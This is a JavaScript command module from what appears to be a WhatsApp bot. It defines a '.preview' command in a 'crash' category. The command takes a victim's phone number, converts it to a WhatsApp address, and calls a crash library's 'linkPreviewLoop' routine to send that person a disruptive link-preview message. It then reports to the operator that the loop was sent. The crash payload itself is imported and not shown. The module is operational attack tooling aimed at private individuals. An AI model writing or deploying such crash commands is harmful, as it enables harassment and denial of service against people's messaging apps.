'use strict';
const { CrashLib } = require('../../lib/crashlib');

module.exports = {
    name: 'preview',
    aliases: ['linkpreview', 'previewloop'],
    category: 'crash',
    desc: 'ʟɪɴᴋ ᴘʀᴇᴠɪᴇᴡ ʟᴏᴏᴘ',
    usage: '.preview <number>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const prefix = s.prefix || '.';
        
        if (!args[0]) {
            return sock.sendMessage(ctx.from, { 
                text: `❌ *ᴡʀᴏɴɢ ᴜsᴀɢᴇ*\n\n📌 *Usage:* ${prefix}preview <number>\n📝 *Example:* ${prefix}preview 2348012345678` 
            }, { quoted: msg });
        }
        
        const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        
        let crashLib = global.getCrashLib?.(sock);
        if (!crashLib) {
            crashLib = new CrashLib(sock);
        }
        
        await sock.sendMessage(ctx.from, { text: '💥 sᴇɴᴅɪɴɢ ᴘʀᴇᴠɪᴇᴡ ʟᴏᴏᴘ...' }, { quoted: msg });
        
        try {
            await crashLib.linkPreviewLoop(target, msg);
            return sock.sendMessage(ctx.from, { text: '✅ ᴘʀᴇᴠɪᴇᴡ ʟᴏᴏᴘ sᴇɴᴛ ᴛᴏ ' + target }, { quoted: msg });
        } catch (e) {
            return sock.sendMessage(ctx.from, { text: '❌ ᴇʀʀᴏʀ: ' + e.message }, { quoted: msg });
        }
    }
};